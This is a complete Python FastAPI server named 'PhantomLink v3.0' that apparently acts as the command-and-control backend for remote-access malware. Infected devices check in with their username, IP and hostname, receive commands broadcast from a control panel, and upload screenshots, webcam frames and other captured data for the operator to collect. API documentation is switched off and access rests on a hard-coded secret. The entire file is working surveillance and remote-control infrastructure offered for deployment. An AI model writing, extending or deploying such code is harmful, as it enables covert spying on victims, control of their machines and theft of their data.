# main.py | PhantomLink v3.0 | FastAPI | Render
# pip install fastapi uvicorn
# uvicorn main:app --host 0.0.0.0 --port $PORT

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import time, threading, asyncio

app = FastAPI(title="PhantomLink", docs_url=None, redoc_url=None)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

SECRET         = "phantomlink2025"
DEVICE_TIMEOUT = 30
MAX_DATA       = 30

devices:     dict = {}
commands:    dict = {}
screenshots: dict = {}
data_store:  dict = {}
cam_frames:  dict = {}
_lock = threading.Lock()

def _auth(s: str):
    if s != SECRET:
        raise HTTPException(403, "forbidden")

# ── Models ────────────────────────────────────────────────────────
class HeartbeatBody(BaseModel):
    secret: str; device_id: str; username: str
    ip: str; version: str; hostname: str = ""; os_info: str = ""

class SendBody(BaseModel):
    secret: str; action: str; data: str = ""; target: str = "all"

class ScreenshotBody(BaseModel):
    secret: str; device_id: str; image: str

class CamFrameBody(BaseModel):
    secret: str; device_id: str; image: str

class DataBody(BaseModel):
    secret: str; device_id: str; type: str; payload: str

# ── Client endpoints ──────────────────────────────────────────────
@app.post("/heartbeat")
def heartbeat(b: HeartbeatBody):
    _auth(b.secret)
    with _lock:
        devices[b.device_id] = {
            "name": b.username, "ip": b.ip, "version": b.version,
            "hostname": b.hostname, "os": b.os_info,
            "last_seen": time.time(), "online": True,
        }
        if b.device_id not in commands:
            commands[b.device_id] = {"action": "none", "data": ""}
    return {"ok": True}

@app.get("/poll")
def poll(secret: str, device_id: str):
    _auth(secret)
    with _lock:
        cmd = commands.get(device_id, {"action": "none", "data": ""})
        commands[device_id] = {"action": "none", "data": ""}
    return cmd

@app.post("/screenshot")
def upload_screenshot(b: ScreenshotBody):
    _auth(b.secret)
    with _lock:
        screenshots[b.device_id] = b.image
    return {"ok": True}

@app.post("/camframe")
def upload_camframe(b: CamFrameBody):
    _auth(b.secret)
    with _lock:
        cam_frames[b.device_id] = b.image
    return {"ok": True}

@app.post("/data")
def upload_data(b: DataBody):
    _auth(b.secret)
    with _lock:
        bucket = data_store.setdefault(b.device_id, [])
        bucket.append({"type": b.type, "payload": b.payload, "ts": time.time()})
        if len(bucket) > MAX_DATA:
            data_store[b.device_id] = bucket[-MAX_DATA:]
    return {"ok": True}

# ── Control Panel endpoints ───────────────────────────────────────
@app.get("/devices")
def list_devices(secret: str):
    _auth(secret)
    now = time.time()
    with _lock:
        return {
            did: {**info, "online": (now - info["last_seen"]) < DEVICE_TIMEOUT}
            for did, info in devices.items()
        }

@app.post("/send")
def send_command(b: SendBody):
    _auth(b.secret)
    cmd = {"action": b.action, "data": b.data}
    with _lock:
        if b.target == "all":
            for did in devices:
                commands[did] = cmd
        else:
            commands[b.target] = cmd
    return {"ok": True}

@app.get("/screenshot")
def get_screenshot(secret: str, device_id: str):
    _auth(secret)
    with _lock:
        return {"image": screenshots.get(device_id)}

@app.get("/camframe")
def get_camframe(secret: str, device_id: str):
    _auth(secret)
    with _lock:
        return {"image": cam_frames.get(device_id)}

@app.get("/data")
def get_data(secret: str, device_id: str):
    _auth(secret)
    with _lock:
        items = list(data_store.get(device_id, []))
        data_store[device_id] = []
    return {"items": items}

# ── Keep-alive ping ───────────────────────────────────────────────
@app.get("/ping")
def ping():
    return {"status": "ok", "ts": time.time()}

@app.get("/")
def root():
    return {"status": "PhantomLink v3.0 online"}
    
